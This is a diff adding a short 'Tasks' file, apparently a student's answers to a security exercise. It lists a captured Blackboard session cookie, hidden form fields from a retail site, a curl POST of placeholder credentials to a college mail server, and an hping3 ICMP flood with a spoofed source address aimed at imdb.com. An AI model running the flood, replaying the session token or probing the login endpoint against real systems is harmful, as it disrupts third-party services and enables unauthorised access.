@@ -1,0 +1,23 @@
+Tasks
+1.  Name: JSESSIONID
+    Value/Content: C7717F92FFDE9132E05CD4239A25FC3D
+    Path: /
+    Domain: bb-gbc.blackboard.com
+
+2.  Domain: https://www.iheartscout.com/
+    <input type="hidden" name="form_type" value="customer">
+    <input type="hidden" name="utf8" value="✓">
+    <input type="hidden" name="contact[tags]" value="prospect,newsletter">
+    <input type="hidden" name="contact[first_name]" value="Newsletter">
+    <input type="hidden" name="contact[last_name]" value="Subscriber">
+    Form method: POST
+
+3.  curl -d "username=fake&password=student" -X POST https://mail.georgebrown.ca
+
+4.  hping3 -1 --flood -a 192.168.100.65 imdb.com
+
+5.  Domain: https://www.iheartscout.com/
+    <!-- Custom Fonts -->
+    <!-- Mobile Specific Metas -->
+    <!-- Stylesheets for Retina 3.2 -->
+    <!--[if IE 9 ]><html class="ie ie9" lang="en"> <![endif]-->
